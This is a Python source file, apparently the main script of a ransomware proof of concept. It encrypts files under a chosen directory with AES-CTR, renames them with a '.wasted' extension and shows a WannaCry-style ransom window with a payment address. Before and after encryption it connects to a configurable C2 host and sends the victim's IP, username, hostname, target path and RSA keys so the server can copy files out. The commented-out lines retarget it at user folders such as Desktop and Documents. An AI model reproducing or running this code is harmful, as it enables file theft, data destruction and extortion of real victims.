from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util import Counter
import argparse
import os
import sys
import base64
import platform 
import getpass
import socket
import base64
import logging
from datetime import datetime
import time
from dotenv import load_dotenv

from ransomware import discover
from ransomware import modify
from ransomware.gui_main import WannaCryGUI

# Load environment variables from .env
load_dotenv()

HARDCODED_KEY = os.environ.get('HARDCODED_KEY')
if not HARDCODED_KEY:
    print('[ERROR] HARDCODED_KEY is missing from environment.')
    sys.exit(1)
HARDCODED_KEY = HARDCODED_KEY.encode()

SERVER_PUBLIC_RSA_KEY = os.environ.get('SERVER_PUBLIC_RSA_KEY')
if not SERVER_PUBLIC_RSA_KEY:
    print('[ERROR] SERVER_PUBLIC_RSA_KEY is missing from environment.')
    sys.exit(1)
else:
    SERVER_PUBLIC_RSA_KEY = SERVER_PUBLIC_RSA_KEY.replace('\\n', '\n')

SERVER_PRIVATE_RSA_KEY = os.environ.get('SERVER_PRIVATE_RSA_KEY')
if not SERVER_PRIVATE_RSA_KEY:
    print('[ERROR] SERVER_PRIVATE_RSA_KEY is missing from environment.')
    sys.exit(1)
else:
    SERVER_PRIVATE_RSA_KEY = SERVER_PRIVATE_RSA_KEY.replace('\\n', '\n')

extension = os.environ.get('extension', '.wasted')
host = os.environ.get('host', '127.0.0.1')
port = int(os.environ.get('port', 8080))
PAYMENT_ADDRESS = os.environ.get('PAYMENT_ADDRESS', '1BitcoinEaterAddressDontSendf59kuE')

# -----------------
# LOGGING SETUP
# -----------------
def setup_logging():
    """Setup logging configuration to track all activities"""
    # Create logs directory if it doesn't exist
    if not os.path.exists('logs'):
        os.makedirs('logs')
    
    # Create log filename with timestamp
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_filename = f'logs/ransomware_activity_{timestamp}.log'
    
    # Configure logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(log_filename, encoding='utf-8'),
            logging.StreamHandler(sys.stdout)
        ]
    )
    
    logger = logging.getLogger(__name__)
    logger.info("=" * 60)
    logger.info("RANSOMWARE PoC ACTIVITY LOG STARTED")
    logger.info("=" * 60)
    logger.info(f"Log file: {log_filename}")
    logger.info(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    logger.info(f"Platform: {platform.system()} {platform.release()}")
    logger.info(f"Python version: {sys.version}")
    logger.info(f"User: {getpass.getuser()}")
    logger.info(f"Hostname: {platform.node()}")
    logger.info("=" * 60)
    
    return logger

# Initialize logger
logger = setup_logging()

# -----------------
# GLOBAL VARIABLES
# CHANGE IF NEEDED
# -----------------
def getlocalip():
    logger.info("Retrieving local IP address")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))
    local_ip = s.getsockname()[0]
    logger.info(f"Local IP address: {local_ip}")
    return local_ip

def parse_args():
    logger.info("Setting up argument parser")
    parser = argparse.ArgumentParser(description='Ransomware PoC')
    parser.add_argument('-p', '--path', help='Absolute path to start encryption. If none specified, defaults to %%HOME%%/test_ransomware', action="store")

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-e', '--encrypt', help='Enable encryption of files',
                        action='store_true')
    group.add_argument('-d', '--decrypt', help='Enable decryption of encrypted files',
                        action='store_true')
    
    logger.info("Parsing command line arguments")
    args = parser.parse_args()
    logger.info(f"Arguments parsed - Path: {args.path}, Encrypt: {args.encrypt}, Decrypt: {args.decrypt}")
    return args

def main():
    logger.info("Starting main function")
    
    if len(sys.argv) <= 1:
        logger.warning("No arguments provided, showing usage")
        print('[*] Ransomware - PoC\n')
        # banner()        
        print('Usage: python3 main_v2.py -h')
        print('{} -h for help.'.format(sys.argv[0]))
        logger.info("Exiting due to no arguments")
        exit(0)

    # Parse arguments
    logger.info("Parsing command line arguments")
    args = parse_args()
    encrypt = args.encrypt
    decrypt = args.decrypt
    
    absolute_path = str(args.path)
    
    logger.info(f"Operation mode: {'ENCRYPT' if encrypt else 'DECRYPT'}")
    logger.info(f"Target path: {absolute_path}")
    
    # Force one click and comment out args above
    # absolute_path = "None"
    # encrypt = True 
    # decrypt = False
    
    if absolute_path != 'None':
        startdirs = [absolute_path]
        logger.info(f"Using specified path: {absolute_path}")
    else:
        # Check OS
        plt = platform.system()
        logger.info(f"Detected operating system: {plt}")
        
        if plt == "Linux" or plt == "Darwin":
            startdirs = [os.environ['HOME'] + '/test_ransomware']
            logger.info(f"Using Linux/Mac path: {startdirs[0]}")
        elif plt == "Windows":
            startdirs = [os.environ['USERPROFILE'] + '\\test_ransomware']
            logger.info(f"Using Windows path: {startdirs[0]}")
            # Can also hardcode additional directories
            # startdirs = [os.environ['USERPROFILE'] + '\\Desktop', 
                        # os.environ['USERPROFILE'] + '\\Documents',
                        # os.environ['USERPROFILE'] + '\\Music',
                        # os.environ['USERPROFILE'] + '\\Desktop',
                        # os.environ['USERPROFILE'] + '\\Onedrive']
        else:
            logger.error(f"Unidentified system: {plt}")
            print("Unidentified system")
            exit(0)
   
    # Encrypt AES key with attacker's embedded RSA public key 
    logger.info("Initializing RSA encryption for AES key")
    server_key = RSA.importKey(SERVER_PUBLIC_RSA_KEY)
    encryptor = PKCS1_OAEP.new(server_key)
    encrypted_key = encryptor.encrypt(HARDCODED_KEY)
    encrypted_key_b64 = base64.b64encode(encrypted_key).decode("ascii")
    logger.info("AES key encrypted with RSA public key")

    print("Encrypted key " + encrypted_key_b64 + "\n")
    logger.info(f"Encrypted key (base64): {encrypted_key_b64}")
 
    if encrypt:
        key = HARDCODED_KEY
        logger.info("Using hardcoded AES key for encryption")
    if decrypt:
        # RSA Decryption function - warning that private key is hardcoded for testing purposes
        logger.info("Decrypting AES key using RSA private key")
        rsa_key = RSA.importKey(SERVER_PRIVATE_RSA_KEY)
        decryptor = PKCS1_OAEP.new(rsa_key)
        key = decryptor.decrypt(base64.b64decode(encrypted_key_b64))
        logger.info("AES key decrypted successfully")

    # Create AES counter and AES cipher
    logger.info("Creating AES cipher with CTR mode")
    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)
    
    # Recursively go through folders and encrypt/decrypt files
    logger.info("Starting file discovery and processing")
    total_files_processed = 0
    
    # Connect to C2 server BEFORE encryption to copy clean files
    if encrypt:
        logger.info("Connecting to C2 server BEFORE encryption to copy clean files")
        def pre_encryption_connector():
            logger.info(f"Attempting to connect to C2 server: {host}:{port}")
            server = socket.socket(socket.AF_INET)
            server.settimeout(10)
            try:
                # Send target directory BEFORE encryption
                server.connect((host, port))
                local_ip = getlocalip()
                target_dir = startdirs[0] if startdirs else "None"
                msg = '%s$%s$%s$%s$%s$%s$%s' % (
                    local_ip, platform.system(), SERVER_PRIVATE_RSA_KEY, SERVER_PUBLIC_RSA_KEY, getpass.getuser(), platform.node(), target_dir)
                server.send(msg.encode('utf-8'))
                logger.info(f"Successfully sent target directory to C2 server: {host}:{port}")
                logger.info(f"Sent data includes: IP={local_ip}, User={getpass.getuser()}, Hostname={platform.node()}, TargetDir={target_dir}")
                logger.info("C2 server will now copy clean files before encryption begins")
                server.close()
            except ConnectionRefusedError:
                logger.info(f"C2 server not available at {host}:{port} (connection refused) - continuing without file exfiltration")
            except socket.timeout:
                logger.warning(f"C2 server connection timed out at {host}:{port} - continuing without file exfiltration")
            except Exception as e:
                logger.warning(f"Unexpected error connecting to C2 server: {str(e)} - continuing without file exfiltration")
        
        try:
            pre_encryption_connector()
            # Add a small delay to ensure C2 server has time to copy files
            logger.info("Waiting for C2 server to complete file exfiltration...")
            time.sleep(2)  # Wait 2 seconds for file copying to complete
            logger.info("Proceeding with file encryption...")
        except Exception as e:
            logger.error(f"Error in pre-encryption C2 connection: {str(e)}")
    
    for currentDir in startdirs:
        logger.info(f"Processing directory: {currentDir}")
        
        try:
            discovered_files = list(discover.discoverFiles(currentDir))  # Convert generator to list
            logger.info(f"Discovered {len(discovered_files)} files in {currentDir}")
            
            for file in discovered_files:
                total_files_processed += 1
                
                if encrypt and not file.endswith(extension):
                    logger.info(f"Encrypting file: {file}")
                    try:
                        modify.modify_file_inplace(file, crypt.encrypt)
                        os.rename(file, file + extension)
                        logger.info(f"Successfully encrypted: {file} -> {file + extension}")
                        print("File changed from " + file + " to " + file + extension)
                    except Exception as e:
                        logger.error(f"Failed to encrypt {file}: {str(e)}")
                        
                if decrypt and file.endswith(extension):
                    logger.info(f"Decrypting file: {file}")
                    try:
                        modify.modify_file_inplace(file, crypt.encrypt)
                        file_original = os.path.splitext(file)[0]
                        os.rename(file, file_original)
                        logger.info(f"Successfully decrypted: {file} -> {file_original}")
                        print("File changed from " + file + " to " + file_original)
                    except Exception as e:
                        logger.error(f"Failed to decrypt {file}: {str(e)}")
                        
        except Exception as e:
            logger.error(f"Error processing directory {currentDir}: {str(e)}")
    
    logger.info(f"Total files processed: {total_files_processed}")
            
    if encrypt: 
        logger.info("Starting key exfiltration and GUI launch")
        # Exfiltrate encrypted key to C2
        def connector():
            target_dir = startdirs[0] if startdirs else "None"
            logger.info(f"Attempting to connect to C2 server: {host}:{port}")
            server = socket.socket(socket.AF_INET)
            server.settimeout(10)
            try:
                # Send Key
                server.connect((host, port))
                local_ip = getlocalip()
                # Include target directory in the message
                msg = '%s$%s$%s$%s$%s$%s$%s' % (
                    local_ip, platform.system(), SERVER_PRIVATE_RSA_KEY, SERVER_PUBLIC_RSA_KEY, getpass.getuser(), platform.node(), target_dir)
                server.send(msg.encode('utf-8'))
                logger.info(f"Successfully sent data to C2 server: {host}:{port}")
                logger.info(f"Sent data includes: IP={local_ip}, User={getpass.getuser()}, Hostname={platform.node()}, TargetDir={target_dir}")

                # if plt == "Windows"
                logger.info("Launching WannaCry-style GUI window")
                decrypt_cmd = [sys.executable, sys.argv[0], "-p", target_dir, "-d"]
                app = WannaCryGUI(target_dir=target_dir, decrypt_cmd=decrypt_cmd)
                app.mainloop()
                logger.info("GUI window closed")
            except ConnectionRefusedError:
                logger.info(f"C2 server not available at {host}:{port} (connection refused) - continuing in offline mode")
                # if plt == "Windows"
                # Do not send key, encrypt anyway.
                logger.info("Launching WannaCry-style GUI window (offline mode)")
                decrypt_cmd = [sys.executable, sys.argv[0], "-p", target_dir, "-d"]
                app = WannaCryGUI(target_dir=target_dir, decrypt_cmd=decrypt_cmd)
                app.mainloop()
                logger.info("GUI window closed")
            except socket.timeout:
                logger.warning(f"C2 server connection timed out at {host}:{port} - continuing in offline mode")
                logger.info("Launching WannaCry-style GUI window (offline mode)")
                decrypt_cmd = [sys.executable, sys.argv[0], "-p", target_dir, "-d"]
                app = WannaCryGUI(target_dir=target_dir, decrypt_cmd=decrypt_cmd)
                app.mainloop()
                logger.info("GUI window closed")
            except Exception as e:
                logger.warning(f"Unexpected error connecting to C2 server: {str(e)} - continuing in offline mode")
                # if plt == "Windows"
                # Do not send key, encrypt anyway.
                logger.info("Launching WannaCry-style GUI window (offline mode)")
                decrypt_cmd = [sys.executable, sys.argv[0], "-p", target_dir, "-d"]
                app = WannaCryGUI(target_dir=target_dir, decrypt_cmd=decrypt_cmd)
                app.mainloop()
                logger.info("GUI window closed")
        try:
            connector()
        except KeyboardInterrupt:
            logger.info("Received keyboard interrupt, exiting")
            sys.exit(0)

    # This wipes the key out of memory
    # to avoid recovery by third party tools
    logger.info("Wiping encryption key from memory")
    for _ in range(100):
        #key = random(32)
        pass
    logger.info("Key wipe completed")
    logger.info("=" * 60)
    logger.info("RANSOMWARE PoC ACTIVITY LOG ENDED")
    logger.info("=" * 60)

if __name__=="__main__":
    main()
